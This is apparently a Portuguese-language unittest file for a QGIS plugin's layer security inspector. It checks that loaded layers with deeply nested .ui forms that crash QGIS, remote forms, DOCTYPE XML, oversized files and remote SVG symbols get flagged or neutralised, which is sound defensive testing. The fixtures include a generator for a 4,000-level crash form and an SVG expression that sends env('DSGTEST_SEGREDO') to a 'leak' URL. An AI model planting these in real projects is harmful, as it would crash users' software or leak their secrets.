# -*- coding: utf-8 -*-
"""
Inspeção de camadas ao carregar (avaliação de segurança do CDCiber, 2026,
achados 4.3, 4.4 e 4.6.2).

No QGIS 4.2.1 um formulário .ui com 4.000 níveis de aninhamento derruba o
processo ao instanciar o QgsAttributeForm (estouro de pilha), por isso este
teste NUNCA instancia o formulário perigoso: confere só que a camada saiu do
layout UiFile para o gerado pelo QGIS. O único QgsAttributeForm criado aqui
é o do .ui benigno.

Sem o pacote DsgTools.core.Security (código anterior à correção) os testes
de camada rodam sem inspetor e reprovam pelo layout que ficou em UiFile.
"""
import os
import shutil
import tempfile
import time
import unittest
from pathlib import Path

from qgis.core import (
    Qgis,
    QgsApplication,
    QgsFeature,
    QgsMarkerSymbol,
    QgsNetworkAccessManager,
    QgsProject,
    QgsProperty,
    QgsSettings,
    QgsSingleSymbolRenderer,
    QgsSvgMarkerSymbolLayer,
    QgsSymbolLayer,
    QgsVectorLayer,
)
from qgis.PyQt.QtCore import QCoreApplication, QUrl
from qgis.testing import start_app

start_app()

try:
    from DsgTools.core.Security import LayerInspector, avaliarFormularioUi
except ImportError:  # código anterior à correção
    LayerInspector = avaliarFormularioUi = None

TAG = "DSGTools Segurança"
CHAVES = ("dsgtools/security/inspectLayers", "dsgtools/security/uiMaxDepth", "dsgtools/security/uiMaxBytes")
RAIZ_PLUGIN = Path(__file__).resolve().parent.parent / "DsgTools"
CABECALHO = '<?xml version="1.0" encoding="UTF-8"?>\n<ui version="4.0"><class>Form</class>\n'
UI_FILE = Qgis.AttributeFormLayout.UiFile
GERADO = Qgis.AttributeFormLayout.AutoGenerated


def uiAninhado(n):
    abre = "".join(f'<widget class="QWidget" name="w{i}">' for i in range(n))
    return CABECALHO + abre + '<widget class="QLineEdit" name="nome"/>' + "</widget>" * n + "</ui>"


UI_BENIGNO = CABECALHO + '<widget class="QWidget" name="Form"><widget class="QLineEdit" name="nome"/></widget></ui>'


def sinalDoLog():
    # No QGIS 4.2.1 o messageReceived(mensagem, tag, nível) não chega ao Python.
    log = QgsApplication.messageLog()
    if hasattr(log, "messageReceivedWithFormat"):
        return log.messageReceivedWithFormat
    return log.messageReceived[str, str, Qgis.MessageLevel]


def espera(segundos):
    fim = time.time() + segundos
    while time.time() < fim:
        QCoreApplication.processEvents()
        time.sleep(0.05)


def camadaMemoria(nome):
    camada = QgsVectorLayer("Point?crs=EPSG:4326&field=nome:string", nome, "memory")
    f = QgsFeature(camada.fields())
    f["nome"] = "x"
    camada.dataProvider().addFeatures([f])
    return camada


def comFormulario(camada, uiForm):
    config = camada.editFormConfig()
    config.setLayout(UI_FILE)
    config.setUiForm(uiForm)
    camada.setEditFormConfig(config)
    return camada


def camadaGpkg(pasta, nome):
    from osgeo import ogr, osr

    arq = os.path.join(pasta, f"{nome}.gpkg")
    ds = ogr.GetDriverByName("GPKG").CreateDataSource(arq)
    srs = osr.SpatialReference()
    srs.ImportFromEPSG(4326)
    lay = ds.CreateLayer(nome, srs, ogr.wkbPoint)
    lay.CreateField(ogr.FieldDefn("nome", ogr.OFTString))
    feat = ogr.Feature(lay.GetLayerDefn())
    feat.SetField("nome", "x")
    feat.SetGeometry(ogr.CreateGeometryFromWkt("POINT (0 0)"))
    lay.CreateFeature(feat)
    ds = None
    return QgsVectorLayer(f"{arq}|layername={nome}", nome, "ogr")


class TestLayerInspector(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.pasta = tempfile.mkdtemp(prefix="dsgtest_inspecao_")
        cls.arquivos = {}
        casos = {
            "aninhado_4000": uiAninhado(4000),
            "aninhado_250": uiAninhado(250),
            "aninhado_300": uiAninhado(300),
            "benigno": UI_BENIGNO,
            "truncado": uiAninhado(50)[:-200],
            "doctype": CABECALHO.replace("<ui", '<!DOCTYPE ui [<!ENTITY a "aaaa">]>\n<ui', 1)
            + '<widget class="QWidget" name="Form"/></ui>',
            # 6 MiB de texto num rótulo: acima do teto de 5 MiB.
            "grande": CABECALHO
            + '<widget class="QWidget" name="Form"><widget class="QLabel" name="r"><property name="text"><string>'
            + "A" * (6 * 2**20)
            + "</string></property></widget></widget></ui>",
        }
        for nome, conteudo in casos.items():
            arq = os.path.join(cls.pasta, f"{nome}.ui")
            with open(arq, "w", encoding="utf-8") as f:
                f.write(conteudo)
            cls.arquivos[nome] = arq
        # Nada sai para a rede durante o teste (o .ui remoto é buscado no setUiForm).
        cls.desvio = QgsNetworkAccessManager.setRequestPreprocessor(
            lambda r: (r.setUrl(QUrl("bloqueado:")), "")[1]
        )
        s = QgsSettings()
        cls.original = {k: s.value(k) for k in CHAVES}
        for k in CHAVES:
            s.remove(k)
        cls.log = []
        sinalDoLog().connect(cls._aoLogar)

    @classmethod
    def _aoLogar(cls, mensagem, tag, nivel, *resto):
        if tag == TAG:
            cls.log.append(mensagem)

    @classmethod
    def tearDownClass(cls):
        QgsProject.instance().clear()
        try:
            sinalDoLog().disconnect(cls._aoLogar)
        except TypeError:
            pass
        QgsNetworkAccessManager.removeRequestPreprocessor(cls.desvio)
        s = QgsSettings()
        for chave, valor in cls.original.items():
            if valor is not None:
                s.setValue(chave, valor)
        shutil.rmtree(cls.pasta, ignore_errors=True)

    def setUp(self):
        type(self).log.clear()
        self.inspetor = None
        if LayerInspector is not None:
            self.inspetor = LayerInspector(None)
            self.inspetor.install()

    def tearDown(self):
        if self.inspetor is not None:
            self.inspetor.uninstall()
        QgsProject.instance().clear()

    def carregar(self, camada):
        QgsProject.instance().addMapLayer(camada)
        espera(0.2)
        return camada.editFormConfig().layout()

    # formulário ----------------------------------------------------------
    def test_ui_com_4000_niveis_vai_para_o_gerado(self):
        camada = comFormulario(camadaMemoria("aninhado_4000"), self.arquivos["aninhado_4000"])
        self.assertEqual(self.carregar(camada), GERADO)
        self.assertTrue([m for m in self.log if "aninhado_4000" in m and "aninhamento" in m], self.log)

    def test_ui_remoto_vai_para_o_gerado(self):
        camada = comFormulario(camadaMemoria("form_remoto"), "http://127.0.0.1:9/form_remoto.ui")
        self.assertEqual(self.carregar(camada), GERADO)
        self.assertTrue([m for m in self.log if "form_remoto" in m and "formulário remoto" in m], self.log)

    def test_ui_benigno_e_mantido_e_abre(self):
        camada = comFormulario(camadaMemoria("benigno"), self.arquivos["benigno"])
        self.assertEqual(self.carregar(camada), UI_FILE)
        self.assertEqual(camada.editFormConfig().uiForm(), self.arquivos["benigno"])
        from qgis.gui import QgsAttributeForm, QgsGui
        from qgis.PyQt.QtWidgets import QLineEdit

        QgsGui.editorWidgetRegistry().initEditors()
        form = QgsAttributeForm(camada, next(camada.getFeatures()))
        self.assertTrue([w for w in form.findChildren(QLineEdit) if w.objectName() == "nome"])
        form.deleteLater()

    def test_teto_de_profundidade_separa_250_de_300_niveis(self):
        abaixo = comFormulario(camadaMemoria("aninhado_250"), self.arquivos["aninhado_250"])
        acima = comFormulario(camadaMemoria("aninhado_300"), self.arquivos["aninhado_300"])
        self.assertEqual(self.carregar(abaixo), UI_FILE)
        self.assertEqual(self.carregar(acima), GERADO)

    def test_xml_invalido_doctype_e_tamanho_vao_para_o_gerado(self):
        for nome, motivo in (("truncado", "XML inválido"), ("doctype", "DOCTYPE"), ("grande", "acima do teto")):
            with self.subTest(nome):
                camada = comFormulario(camadaMemoria(nome), self.arquivos[nome])
                self.assertEqual(self.carregar(camada), GERADO)
                self.assertTrue([m for m in self.log if f"'{nome}'" in m and motivo in m], self.log)

    def test_formularios_do_repositorio_cabem_no_teto(self):
        # Os .ui de produção do plugin (Qt Designer) têm de passar na régua.
        self.assertIsNotNone(avaliarFormularioUi, "pacote DsgTools.core.Security ausente")
        arquivos = sorted(RAIZ_PLUGIN.rglob("*.ui"))
        self.assertGreater(len(arquivos), 50)
        recusados = []
        for arq in arquivos:
            aceito, motivo = avaliarFormularioUi(str(arq))
            if not aceito:
                recusados.append(f"{arq.name}: {motivo}")
        self.assertEqual(recusados, [])

    def test_projeto_relido_troca_o_formulario_antes_de_abrir(self):
        # O projeto de terceiro é RELIDO; a troca acontece no layersAdded da leitura.
        projeto = QgsProject.instance()
        if self.inspetor is not None:
            self.inspetor.uninstall()
        perigoso = comFormulario(camadaGpkg(self.pasta, "relido_4000"), self.arquivos["aninhado_4000"])
        remoto = comFormulario(camadaGpkg(self.pasta, "relido_remoto"), "http://127.0.0.1:9/relido.ui")
        benigno = comFormulario(camadaGpkg(self.pasta, "relido_benigno"), self.arquivos["benigno"])
        projeto.addMapLayers([perigoso, remoto, benigno])
        arq = os.path.join(self.pasta, "relido.qgs")
        self.assertTrue(projeto.write(arq))
        projeto.clear()
        if self.inspetor is not None:
            self.inspetor.install()
        self.assertTrue(projeto.read(arq))
        layouts = {c.name(): c.editFormConfig().layout() for c in projeto.mapLayers().values()}
        self.assertEqual(
            layouts, {"relido_4000": GERADO, "relido_remoto": GERADO, "relido_benigno": UI_FILE}
        )

    # simbologia ----------------------------------------------------------
    def test_svg_remoto_e_sinalizado(self):
        camada = camadaMemoria("svg_remoto")
        simbolo = QgsMarkerSymbol()
        simbolo.changeSymbolLayer(0, QgsSvgMarkerSymbolLayer("http://127.0.0.1:9/svg_remoto.svg", 5))
        camada.setRenderer(QgsSingleSymbolRenderer(simbolo))
        self.carregar(camada)
        self.assertTrue([m for m in self.log if "svg_remoto" in m and "SVG remoto" in m], self.log)

    def test_svg_por_expressao_com_env_e_sinalizado(self):
        camada = camadaMemoria("svg_env")
        sl = QgsSvgMarkerSymbolLayer("x.svg", 5)
        sl.setDataDefinedProperty(
            QgsSymbolLayer.Property.Name,
            QgsProperty.fromExpression("'http://127.0.0.1:9/leak?v=' || env('DSGTEST_SEGREDO')"),
        )
        simbolo = QgsMarkerSymbol()
        simbolo.changeSymbolLayer(0, sl)
        camada.setRenderer(QgsSingleSymbolRenderer(simbolo))
        self.carregar(camada)
        self.assertTrue([m for m in self.log if "svg_env" in m and "expressão" in m], self.log)

    def test_svg_local_nao_e_sinalizado(self):
        camada = camadaMemoria("svg_local")
        simbolo = QgsMarkerSymbol()
        simbolo.changeSymbolLayer(0, QgsSvgMarkerSymbolLayer("symbol/poi_cave.svg", 5))
        camada.setRenderer(QgsSingleSymbolRenderer(simbolo))
        self.carregar(camada)
        self.assertEqual([m for m in self.log if "svg_local" in m], [])


if __name__ == "__main__":
    unittest.main()
